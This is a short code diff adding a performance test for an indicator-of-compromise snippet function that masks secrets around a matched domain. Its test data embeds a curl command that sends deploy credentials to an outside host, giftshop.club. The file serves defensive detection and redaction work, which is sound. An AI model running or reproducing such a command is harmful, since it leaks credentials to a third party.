@@ -18,3 +18,14 @@ describe('iocSnippet', () => {
     expect(out).toMatch(re);
   });
 });
+
+describe('iocSnippet — long lines', () => {
+  it('stays fast on a long line of flag-shaped text and still masks around the match', () => {
+    const line = '-p x '.repeat(160_000) + `curl -u deploy:${SECRET} https://giftshop.club/up ` + '-p x '.repeat(10_000);
+    const start = Date.now();
+    const out = iocSnippet(line, domainBoundaryRegex('giftshop.club'));
+    expect(Date.now() - start).toBeLessThan(2_000);
+    expect(out).toContain('giftshop.club');
+    expect(out).not.toContain(SECRET);
+  });
+});
